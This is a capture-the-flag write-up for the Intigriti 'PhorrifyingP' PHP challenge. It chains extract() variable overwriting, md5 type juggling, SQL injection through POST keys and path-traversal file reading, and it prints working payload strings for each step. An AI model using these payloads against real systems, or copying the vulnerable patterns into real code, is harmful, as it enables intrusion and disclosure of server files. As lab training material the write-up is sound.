# Intigriti CTF — PhorrifyingP

PHP challenge having multiple vulnerabilities.
  - PHP extract method
  - Type juggling
  - SQL injection
  - LFI 

Source code provided by the challenge

```
<?php
/*
    <flag> ➡➡➡ ⛳🏁 ⬅⬅⬅ <flag>
*/
if ($_SERVER['REQUEST_METHOD'] == 'POST'){
    extract($_POST);

    if (isset($_POST['password']) && md5($_POST['password']) == 'put hash here!'){
        $loggedin = true;
    }

    if (md5($_SERVER['REMOTE_ADDR']) != '92d3fd4057d07f38474331ab231e1f0d'){
        header('Location: ' . $_SERVER['REQUEST_URI']);
    }

    if (isset($loggedin) && $loggedin){
        echo 'One step closer 😎<br>';

        if (isset($_GET['action']) && md5($_GET['action']) == $_GET['action']){
            echo 'Really? 😅<br>';

            $db = new SQLite3('database.db');
            $sql_where = Array('1=0');

            foreach ($_POST as $key => $data) {
                $sql_where[] = $db->escapeString($key) . "='" . $db->escapeString($data) . "'";
            }

            $result = $db->querySingle('SELECT login FROM users WHERE ' . implode(' AND ', $sql_where));

            if ($result == 'admin'){
                echo 'Last step 🤣<br>';

                readfile(file_get_contents('php://input'));
            }
        }
    }
}
?>

```
###### Bypassing  loggedin condition

```
if (isset($loggedin) && $loggedin)
```
Here we will exploit **extract** method. **extract($_POST);**  

If you look at php documentation for extract method there is one warning
![image](https://user-images.githubusercontent.com/19681324/158346871-12c4984e-e546-49d3-9992-e98995d7f043.png)

So we can directly pass **loggedin=true** in the post request body to bypass this condition
![image](https://user-images.githubusercontent.com/19681324/158347129-4d2b5593-191c-4f22-bac9-76635e381288.png)


###### Exploiting type juggling
```
(isset($_GET['action']) && md5($_GET['action']) == $_GET['action'])
```
First condition checks for availability of the get parameter with name action and 2nd condition checks if md5 of get parameter is equal to get parameter value itself, which is not possible in any real world. But this is check is done using loose comparison, which can be exploited.

This ![link](https://github.com/bl4de/ctf/blob/master/2017/HackDatKiwi_CTF_2017/md5games1/md5games1.md) here has exploited the same condition. A number which will satisfy this condition is 0e215962017. md5( 0e215962017 ) ---> 0e291242476940776845150308577824

PHP loose comparison will work as below
0e215962017 : will be interpreted as 0
md5( 0e215962017 ) ---> 0e291242476940776845150308577824 : will also be interpreted as 0
 
so there comparison will be true
![image](https://user-images.githubusercontent.com/19681324/158349729-391feef7-a24a-45eb-8341-2fb06c5bb808.png)

###### Exploiting SQL inection

```
  foreach ($_POST as $key => $data) {
                $sql_where[] = $db->escapeString($key) . "='" . $db->escapeString($data) . "'";
            }

            $result = $db->querySingle('SELECT login FROM users WHERE ' . implode(' AND ', $sql_where));
```

sql_were variable is created by retrieving the key and value coming in the post request. escapestring will convert the payload like **UNION+SELECT+"admin"** to **1_UNION_SELECT_** space is being converted to underscore.

However this can be bypassed. Also app uses querySingle which will return a single result, so if we can force the query to return just a single result i.e. admin we can bypass this. 

This can be done easily with the payload
```
1%3d2/**/UNION/**/SELECT/**/"admin"--=aaaa&loggedin=true
```
As you can see in the image we get Last step in the response

![image](https://user-images.githubusercontent.com/19681324/158352580-14f8130a-64f7-4c1f-91d3-9da8909decec.png)

###### Exploiting LFI

At the last of previous step we also saw an error
```
  readfile(1%3d2/**/UNION/**/SELECT/**/&quot;admin&quot;--=aaaa&amp;loggedin=true): failed to open stream: No such file or directory in <b>/var/www/html/index.php
```
All of the post parameter is directly being passed into the read file function. Now we can go up the directory to read index.php file with the ../ pattern

our final payload will be, which will give us the flag
```
1/**/UNION/**/SELECT/**/"admin"--=a&loggedin=true&test=/../../../../../../../../../../var/www/html/index.php
```
![image](https://user-images.githubusercontent.com/19681324/158353333-4570910e-aa29-46b9-ab62-dad66de1ccf6.png)




